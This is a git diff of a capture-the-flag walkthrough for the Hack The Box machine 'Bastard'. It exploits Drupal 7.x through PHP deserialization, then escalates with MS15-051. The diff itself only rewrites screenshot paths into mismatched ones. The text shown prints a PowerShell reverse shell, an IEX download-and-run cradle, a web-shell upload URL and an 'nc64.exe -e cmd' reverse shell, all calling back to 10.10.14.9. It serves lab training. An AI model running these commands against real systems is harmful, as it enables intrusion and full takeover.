@@ -17,7 +17,7 @@ nmap -sV -sC -oA nmap/optimum 10.10.10.8
 ```
 
 ###### Output 
-![](/Windows/Windows-Medium/Bastard/Screenshots/nmap.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/nmap.png)
 
 ```sh
 nmap -sV -sC -oA nmap/bastard 10.10.10.9                                                                                          ─╯
@@ -53,9 +53,9 @@ port[49154]-msrpc
 
 looking at the port 80 we find a landing page [http://10.10.10.9](http://10.10.10.9)
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/bastard.png)so we try to look for the version of the drupal but on the nmap we see that their is  a changelog so we try to see what we can find in the changelog
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/bastard.png)so we try to look for the version of the drupal but on the nmap we see that their is  a changelog so we try to see what we can find in the changelog
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/changelog.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/changelog.png)
 
 now searching for the exploit using searchsploit reveles that drupal 7.x can be a potential exploit of a `Remote code Execution` 
 
@@ -63,18 +63,18 @@ now searching for the exploit using searchsploit reveles that drupal 7.x can be 
 searchsploit Drupal 7.x
 ```
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/searchsploit.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/searchsploit.png)
 
 lets examine the exploit to see what it does.looking at the exploit it trying to abuse the `PHP Seriallization` . The exploit requires a few small modifications to run successfully. There is a syntax error on line 16 as well as line 71. The variables that must be modified are `url`, `endpoint_path`,`filename` and `data`.
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/exploit.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/exploit.png)
 so we have to modify the code a bit best on the gobuser i ran earlier i found out something intresting which is a endpoint which is `rest`
 
-![](Windows/Windows-Medium/Bastard/Screenshots/rest.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/rest.png)
 
 the change would be like this just also to add some interactivity on the shell
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/modified.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/modified.png)
 
 ```sh
 $url = 'http://10.10.10.9';
@@ -101,11 +101,11 @@ $file = [
 
 now we run the script to execute the exploit
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/drupal.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/drupal.png)
 
 so when follow the [http://10.10.10.9/leshack.php](http://10.10.10.9/leshack.php) and execute something from the browser we get a some remote execution
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/remote.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/remote.png)
 
 running the exploit will create the specified PHP file as well as generate `user.json` and
 `session.json` locally. The session file contains valid cookie data for the Drupal `admin user`, and it
@@ -121,7 +121,7 @@ execution.
 
 so we check the  `systeminfo` to see if we can get any information
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/systeminfo.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/systeminfo.png)
 
 now we first have to get a good shell so what we do after getting the remote code execution is to be able to get a good shell 
 
@@ -137,9 +137,9 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',1337);$stream = $
 
 we set a listner to listen for the `bastard.ps1` 
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/pythonserver.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/pythonserver.png)
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/reverseshell.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/reverseshell.png)
 
 As the target is a fresh install of `Windows Server 2008`, it is fairly easy to exploit. No service
 packs or hotfixes have been installed.so we run  the sherlock script just like the prevous box to see if we can find something that is vulnerable
@@ -148,17 +148,17 @@ packs or hotfixes have been installed.so we run  the sherlock script just like t
 IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/sherlork.ps1')
 ```
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/sherlok1.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/sherlok1.png)
 
 This appears to be vulnerable
-![](/Windows/Windows-Medium/Bastard/Screenshots/sherlork2.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/sherlork2.png)
 
 A bit of research reveals quite a few potential exploits,however the most reliable is `MS15-051`. [Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)  and also some search on searchsploit reveels more infomation.
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/ms15.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/ms15.png)
 it revel some compiled 64.vulnerability that can be uploaded to the machine to be runned.
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/ms152.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/ms152.png)
 
 
 so we download this zip which has a good `ms15-051`  for 64 Vulnerability [ZIP](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip) Then we run this code so that we can upload the `mS15-051` and also execute to check if it working.
@@ -167,15 +167,15 @@ so we download this zip which has a good `ms15-051`  for 64 Vulnerability [ZIP](
 http://10.10.10.9/leshack.php?fupload=Ms15.exe&fexec=%20Ms15.exe%20whoami
 ```
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/ms153.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/ms153.png)
 
 checking at the shell we see it has uploaded 
 
-![](Windows/Windows-Medium/Bastard/Screenshots/ms154.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/ms154.png)
 
 now when we go and run we get a confirmation
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/whoami.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/whoami.png)
 
 since we can execute some command using that we need a permanet shell that is easy to use so what we can do is to download a 64 `nc` so that we can use it to execute a reverse shell into the root user. [nc](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) we just upload it the way we uploaded the `Ms15.exe`
 
@@ -185,18 +185,18 @@ and by doing this from the shell
 ./Ms15.exe "nc64.exe -e cmd 10.10.14.9 1338"
 ```
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/shellcode.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/shellcode.png)
 
 or this from the webrowser
 
-![](Windows/Windows-Medium/Bastard/Screenshots/webbrowser.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/webbrowser.png)
 
 we get a shell
 
-![](/Windows/Windows-Medium/Bastard/Screenshots/executableshell.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/executableshell.png)
 
 Then now we obtain the `root and user flag`
 
-![](Windows/Windows-Medium/Bastard/Screenshots/flags.png)
+![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Medium/Bastard/Screenshots/flags.png)
 
 	-------------------------END successful attack @lesley----------------------
